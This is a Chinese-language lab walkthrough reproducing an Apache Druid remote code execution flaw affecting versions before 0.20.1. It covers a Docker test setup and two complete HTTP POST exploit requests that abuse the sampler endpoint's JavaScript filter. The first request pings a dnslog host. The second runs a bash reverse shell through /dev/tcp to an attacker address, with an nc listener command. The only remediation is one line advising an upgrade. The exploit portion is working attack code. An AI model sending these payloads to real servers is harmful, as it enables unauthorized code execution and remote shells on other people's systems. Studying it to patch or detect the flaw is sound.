## 0x01 漏洞简介

Apache Druid是美国阿帕奇软件（Apache）基金会的一款使用Java语言编写的、面向列的开源分布式数据库。

Apache Druid 默认情况下缺乏授权认证，攻击者可以发送特制请求，利用Druid服务器上进程的特权执行任意代码。

##  **0x02 影响版本**

影响版本： Apache Druid < 0.20.1  
安全版本： Apache Druid 0.20.1

## 0x03 漏洞复现

攻击机:win10

靶机:Centos7

### 1.环境搭建

    
    
    docker pull fokkodriesprong/docker-druid #拉取镜像
    docker run --rm -i -p 8888:8888  fokkodriesprong/docker-druid #启动镜像

![1641257502_61d39a1e4f9f539bd6372.jpg!small?1641257510083](https://image.3001.net/images/20220104/1641257502_61d39a1e4f9f539bd6372.jpg!small?1641257510083)

![1641257544_61d39a48f33f8f71db2f8.png!small?1641257555807](https://image.3001.net/images/20220104/1641257544_61d39a48f33f8f71db2f8.png!small?1641257555807)

 **访问靶机ip:8888，出现以下页面，说明搭建成功**

![1641257555_61d39a53ee55b16c1d9ce.jpg!small?1641257563699](https://image.3001.net/images/20220104/1641257555_61d39a53ee55b16c1d9ce.jpg!small?1641257563699)

###  **2.win10开始攻击**

使用bp抓包，并且通过dnslog测试是否可以回显(也就是是否可以代码执行)

POC （poc中的ping 后面的dnslog地址注意更换） (HOST以及Referer处ip也要改成目标ip)

> POST /druid/indexer/v1/sampler?for=filter HTTP/1.1  
> Host: 192.168.166.129:8888  
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0)
> Gecko/20100101 Firefox/85.0  
> Accept: application/json, text/plain, */*  
> Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
> Accept-Encoding: gzip, deflate  
> Content-Type: application/json;charset=utf-8  
> Content-Length: 556  
> Origin: http://192.168.46.131:8888  
> Connection: close  
> Referer: http://192.168.166.129:8888/unified-console.html
>
>
> {"type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"/opt/","filter":""}},"dataSchema":{"dataSource":"sample","parser":{"type":"string","parseSpec":{"format":"json","timestampSpec":{"column":"time","format":"iso"},"dimensionsSpec":{}}},"transformSpec":{"transforms":[],"filter":{"type":"javascript",  
> "function":"function(value){return java.lang.Runtime.getRuntime().exec('ping
> n5ianx.dnslog.cn')}",  
> "dimension":"added",  
> "":{undefined  
> "enabled":"true"  
> }  
> }}}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}

抓包后,发现可以回显，也就是说可以远程代码执行

![1641257616_61d39a90086277801aa81.png!small?1641257626419](https://image.3001.net/images/20220104/1641257616_61d39a90086277801aa81.png!small?1641257626419)

###  **3.反弹shell**

POC （同上一样，只是把ping命令转换为反弹shell的命令）

> POST /druid/indexer/v1/sampler?for=filter HTTP/1.1  
> Host: 192.168.166.129:8888  
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0)
> Gecko/20100101 Firefox/85.0  
> Accept: application/json, text/plain, */*  
> Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
> Accept-Encoding: gzip, deflate  
> Content-Type: application/json;charset=utf-8  
> Content-Length: 556  
> Origin: http://192.168.46.131:8888  
> Connection: close  
> Referer: http://192.168.166.129:8888/unified-console.html
>
>
> {"type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"/opt/","filter":""}},"dataSchema":{"dataSource":"sample","parser":{"type":"string","parseSpec":{"format":"json","timestampSpec":{"column":"time","format":"iso"},"dimensionsSpec":{}}},"transformSpec":{"transforms":[],"filter":{"type":"javascript",  
> "function":"function(value){return
> java.lang.Runtime.getRuntime().exec('/bin/bash -c $@|bash 0 echo bash -i
> >&/dev/tcp/xxx.xxx.xxx.xxx/1122 0>&1')}",  
> "dimension":"added",  
> "":{undefined  
> "enabled":"true"  
> }  
> }}}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}

nc监听端口

> nc -lvvp 1122

构造数据包发送，发现反弹成功

![1641257683_61d39ad3de4bc6fa8356b.jpg!small?1641257691698](https://image.3001.net/images/20220104/1641257683_61d39ad3de4bc6fa8356b.jpg!small?1641257691698)

##  **0x04 漏洞修复**

把Apache Drui更新为安全版本或最新版本

